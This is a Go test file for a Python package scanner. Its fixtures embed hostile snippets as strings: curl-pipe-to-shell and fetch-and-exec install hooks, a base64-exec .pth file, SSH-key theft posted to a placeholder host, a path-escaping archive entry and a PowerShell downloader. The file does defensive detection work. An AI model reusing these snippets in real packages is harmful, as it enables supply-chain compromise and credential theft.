package codescan

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"testing"

	"github.com/crossben/safe-install/internal/analyze"
)

func sdist(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func wheel(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func pyRules(fs []analyze.Finding) map[string]analyze.Severity {
	out := map[string]analyze.Severity{}
	for _, f := range fs {
		out[f.Rule] = f.Severity
	}
	return out
}

func TestMaliciousSetupPy(t *testing.T) {
	data := sdist(t, map[string]string{
		"evil-1.0/setup.py":         "import subprocess\nsubprocess.run('curl -s https://x.example/p.sh | sh', shell=True)\nfrom setuptools import setup\nsetup()\n",
		"evil-1.0/evil/__init__.py": "VERSION = '1.0'\n",
	})
	fs, err := PythonArchive("evil", "evil-1.0.tar.gz", data)
	if err != nil {
		t.Fatal(err)
	}
	got := pyRules(fs)
	if got["SI-BLD-002"] != analyze.Block || got["SI-CODE-001"] != analyze.High {
		t.Fatalf("findings %v", fs)
	}
}

func TestBuildHookEvaluatesFetchedCode(t *testing.T) {
	data := sdist(t, map[string]string{
		"pkg-2.0/hatch_build.py": "import urllib.request\ncode = urllib.request.urlopen('https://x.example/c').read()\nexec(code)\n",
	})
	fs, _ := PythonArchive("pkg", "pkg-2.0.tar.gz", data)
	if pyRules(fs)["SI-BLD-002"] != analyze.Block {
		t.Fatalf("findings %v", fs)
	}
}

func TestPthFiles(t *testing.T) {
	evil := wheel(t, map[string]string{
		"evil.pth":                  "import os, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
		"evil/__init__.py":          "",
		"evil-1.0.dist-info/RECORD": "",
	})
	fs, _ := PythonArchive("evil", "evil-1.0-py3-none-any.whl", evil)
	if pyRules(fs)["SI-PTH-001"] != analyze.High {
		t.Fatalf("evil .pth: %v", fs)
	}
	plain := wheel(t, map[string]string{"hook.pth": "import my_hook\n", "paths.pth": "/opt/lib\n"})
	fs, _ = PythonArchive("hooks", "hooks-1.0-py3-none-any.whl", plain)
	if pyRules(fs)["SI-PTH-001"] != analyze.Medium || len(fs) != 1 {
		t.Fatalf("plain import .pth: %v", fs)
	}
	setuptools := wheel(t, map[string]string{"distutils-precedence.pth": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n"})
	if fs, _ := PythonArchive("setuptools", "setuptools-75.0.0-py3-none-any.whl", setuptools); len(fs) != 0 {
		t.Fatalf("setuptools' own .pth flagged: %v", fs)
	}
}

func TestPythonObfuscationAndExfil(t *testing.T) {
	data := wheel(t, map[string]string{
		"a/armored.py": "from pyarmor_runtime_000000 import __pyarmor__\n__pyarmor__(__name__, __file__, b'...')\n",
		"a/steal.py":   "import os, requests\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nrequests.post('https://x.example', data=key)\n",
	})
	got := pyRules(mustScan(t, "a", "a-1.0-py3-none-any.whl", data))
	if got["SI-CODE-003"] != analyze.Medium || got["SI-CODE-002"] != analyze.High {
		t.Fatalf("findings %v", got)
	}
}

func TestPythonArchiveSafety(t *testing.T) {
	data := sdist(t, map[string]string{
		"../../escape/setup.py": "subprocess.run('curl x | sh')",
		"ok-1.0/ok/util.py":     "def add(a, b):\n    return a + b\n",
	})
	if fs := mustScan(t, "ok", "ok-1.0.tar.gz", data); len(fs) != 0 {
		t.Fatalf("escaping entry was read: %v", fs)
	}
	if _, err := PythonArchive("x", "x-1.0.exe", nil); err == nil {
		t.Fatal("unknown archive type accepted")
	}
	if _, err := PythonArchive("x", "x-1.0.tar.gz", []byte("not gzip")); err == nil {
		t.Fatal("corrupt archive accepted")
	}
}

// Ordinary code that uses the network or subprocess must not be flagged.
func TestPythonCleanCode(t *testing.T) {
	clean := `
import subprocess, requests, base64, json
def version():
    return subprocess.run(["git", "describe"], capture_output=True).stdout
def fetch(url):
    r = requests.get(url, timeout=10)
    return json.loads(r.text)
def decode(s):
    return base64.b64decode(s)
TEMPLATE = compile("x + 1", "<expr>", "eval")
http = urllib3.PoolManager()
tmpl = re.compile(r"^numpy-.*")
def paste():
    return subprocess.run(["powershell.exe", "-command", "Get-Clipboard"], capture_output=True)
`
	if hits := scanPython(clean); len(hits) != 0 {
		t.Fatalf("clean code flagged: %v", hits)
	}
	// Real false positives found on numpy and pandas, kept as regressions.
	if hits := scanBuild("from setuptools import setup\nsetup(name='x', version='1.0')\n"); len(hits) != 0 {
		t.Fatalf("plain setup.py flagged: %v", hits)
	}
}

func mustScan(t *testing.T, pkg, name string, data []byte) []analyze.Finding {
	t.Helper()
	fs, err := PythonArchive(pkg, name, data)
	if err != nil {
		t.Fatal(err)
	}
	return fs
}

func TestSdistToolingIsNotScanned(t *testing.T) {
	data := sdist(t, map[string]string{
		"pkg-1.0/tools/release.py": "import subprocess\nsubprocess.run('curl -s https://x.example/i.sh | sh', shell=True)\n",
		"pkg-1.0/pkg/__init__.py":  "",
		"pkg-1.0/setup.py":         "from setuptools import setup\nsetup()\n",
	})
	if fs := mustScan(t, "pkg", "pkg-1.0.tar.gz", data); len(fs) != 0 {
		t.Fatalf("maintainer tooling flagged: %v", fs)
	}
	// PowerShell with a web command is still a downloader.
	if hits := scanPython(`subprocess.run(["powershell", "-c", "(New-Object Net.WebClient).DownloadString('https://x.example')"])`); len(hits) == 0 {
		t.Fatal("PowerShell download not flagged")
	}
}
